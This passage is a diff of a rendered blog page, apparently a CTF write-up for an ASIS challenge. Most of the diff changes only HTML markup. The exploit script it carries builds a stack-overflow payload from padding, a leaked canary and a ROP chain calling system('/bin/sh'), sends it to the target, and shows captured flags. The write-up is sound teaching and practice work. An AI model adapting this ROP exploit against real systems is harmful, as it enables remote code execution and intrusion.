-           <span class="s">"0"</span><span class="p">,</span> <span class="c"># padding1</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-           <span class="s">"0"</span><span class="p">,</span> <span class="c"># padding2</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-           <span class="s">"0"</span><span class="p">,</span> <span class="c"># padding3</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-            <span class="s">"0"</span><span class="p">,</span><span class="c">#padding</span>
-           <span class="nb">str</span><span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">40</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># pop_rdi_ret</span>
-           <span class="nb">str</span><span class="p">(</span><span class="n">bin_sh</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">40</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># bin_sh</span>
-           <span class="nb">str</span><span class="p">(</span><span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">40</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
-            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c"># system_addr</span>
-           <span class="p">]</span>
+<span class="n">payloads</span> <span class="o">=</span> <span class="p">[</span><span class="s">"52"</span><span class="p">,</span><span class="c1"># will be adjust later
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="n">lucky_byte1</span><span class="p">,</span>   <span class="c1"># lucky number
+</span>            <span class="n">lucky_byte2</span><span class="p">,</span>   <span class="c1"># lucky number
+</span>            <span class="n">lucky_byte3</span><span class="p">,</span>   <span class="c1"># lucky number
+</span>            <span class="n">lucky_byte4</span><span class="p">,</span>   <span class="c1"># lucky number
+</span>           <span class="s">"1"</span><span class="p">,</span> <span class="c1"># v10 for win
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>           <span class="s">"17"</span><span class="p">,</span> <span class="c1"># i
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># v12_1
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># v12_2
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"8"</span><span class="p">,</span> <span class="c1">#name_buf 0x08
+</span>            <span class="s">"49"</span><span class="p">,</span> <span class="c1">#name_buf 0x31
+</span>            <span class="s">"96"</span><span class="p">,</span> <span class="c1">#name_buf 0x60
+</span>            <span class="s">"0"</span><span class="p">,</span> <span class="c1">#name_buf 0x00
+</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"168"</span><span class="p">,</span> <span class="c1">#name_buf 0xa8
+</span>            <span class="s">"48"</span><span class="p">,</span> <span class="c1">#name_buf 0x30
+</span>            <span class="s">"96"</span><span class="p">,</span> <span class="c1">#name_buf 0x60
+</span>            <span class="s">"0"</span><span class="p">,</span> <span class="c1">#name_buf 0x00
+</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span> <span class="c1"># canary 1
+</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="c1"># canary 2
+</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="c1"># canary 3
+</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="c1"># canary 4
+</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="c1"># canary 5
+</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="c1"># canary 6
+</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="c1"># canary 7
+</span>           <span class="n">canary_byte</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="c1"># canary 8
+</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># padding1
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># padding2
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>           <span class="s">"0"</span><span class="p">,</span> <span class="c1"># padding3
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>            <span class="s">"0"</span><span class="p">,</span><span class="c1">#padding
+</span>           <span class="nb">str</span><span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">40</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">pop_rdi_ret</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># pop_rdi_ret
+</span>           <span class="nb">str</span><span class="p">(</span><span class="n">bin_sh</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">40</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># bin_sh
+</span>           <span class="nb">str</span><span class="p">(</span><span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">40</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
+</span>            <span class="nb">str</span><span class="p">(</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="c1"># system_addr
+</span>           <span class="p">]</span>
 
 <span class="n">payloads</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payloads</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span>
-<span class="c"># sending payload</span>
-<span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
+<span class="c1"># sending payload
+</span><span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="p">:</span>
     <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sending: "</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
@@ -696,7 +696,7 @@ Flag 1: ASIS{109096cca8948d1cebee782a11d2472b}
 
 <p>And Finally, we get the flag2:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>               Good job Mario, but your princess isn't here! 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>               Good job Mario, but your princess isn't here! 
 
                                Get a shell!
 
@@ -824,7 +824,6 @@ Flag 2: ASIS{be70e244675b9acd21ac0097d4f9d69b}
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -844,7 +843,6 @@ Flag 2: ASIS{be70e244675b9acd21ac0097d4f9d69b}
 
         
           
-          
 
 
 
@@ -863,7 +861,6 @@ Flag 2: ASIS{be70e244675b9acd21ac0097d4f9d69b}
 </div>
 
         
-          
           
 
 
@@ -886,7 +883,6 @@ Flag 2: ASIS{be70e244675b9acd21ac0097d4f9d69b}
 
         
           
-          
 
 
 
@@ -907,6 +903,7 @@ Flag 2: ASIS{be70e244675b9acd21ac0097d4f9d69b}
         
       </div>
     </div>
+  
   
 </div>
 
@@ -957,7 +954,7 @@ Flag 2: ASIS{be70e244675b9acd21ac0097d4f9d69b}
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
